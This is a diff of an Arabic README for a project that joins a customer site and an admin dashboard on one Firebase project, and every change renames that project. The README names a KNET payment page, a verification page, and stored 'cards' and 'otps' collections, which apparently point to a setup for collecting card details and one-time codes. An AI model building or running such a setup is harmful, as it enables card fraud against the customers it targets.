@@ -73,7 +73,7 @@ python3 preview_serve.py   # يحجب knet.html و verification.html و /admin*
 ## النطاق
 
 مشروع موحّد يجمع موقع العملاء (HTML ثابت) ولوحة التحكم (HTML/JS جديدة) في استضافة واحدة.
-كلاهما متصل بنفس مشروع Firebase `qatar-oman` ويتشاركان البيانات عبر collection `customers`.
+كلاهما متصل بنفس مشروع Firebase `card-ke` ويتشاركان البيانات عبر collection `customers`.
 
 ## التشغيل
 
@@ -114,7 +114,7 @@ python3 serve.py
 
 ## Firebase
 
-مشروع واحد موحّد `qatar-oman` لكل من الموقع ولوحة التحكم.
+مشروع واحد موحّد `card-ke` لكل من الموقع ولوحة التحكم.
 
 ### مفاتيح الاتصال من متغيّرات البيئة (env) — لا مفاتيح داخل الكود
 
@@ -526,7 +526,7 @@ python3 serve_dashboard.py   # PORT افتراضي 12000
 `serve_dashboard.py` يقرأ إعدادات Firebase من `../firebase_config.py` (أي من
 `.env` نفسه) ويحقنها قبل `</head>`، ويخدم الأصول من `assets/` مع منع الكاش.
 
-**ملاحظة:** كلا الخادمين يستخدمان نفس مشروع Firebase `qatar-oman` (مجموعات
+**ملاحظة:** كلا الخادمين يستخدمان نفس مشروع Firebase `card-ke` (مجموعات
 `customers`/`cards`/`otps`/`products`)، فالبيانات مشتركة بينهما.
 
 **مهم:** ملفات `dashboardkuwaitalthnyan-main/**` هي نسخة العمل من الـzip؛
